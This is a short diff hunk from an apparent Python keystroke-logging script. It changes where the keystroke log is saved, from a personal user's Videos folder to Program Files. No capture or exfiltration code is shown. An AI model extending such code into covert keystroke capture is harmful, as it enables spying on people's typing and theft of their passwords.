@@ -6,7 +6,7 @@ import winsound
 keystroke_count = 0
 
 # Path to save the log file
-log_file_path = r"C:\Users\ZachPrice\Videos\\random.txt"
+log_file_path = r"C:\\Program Files\\random.txt"
 
 # Initialize a list
 keystrokes = []
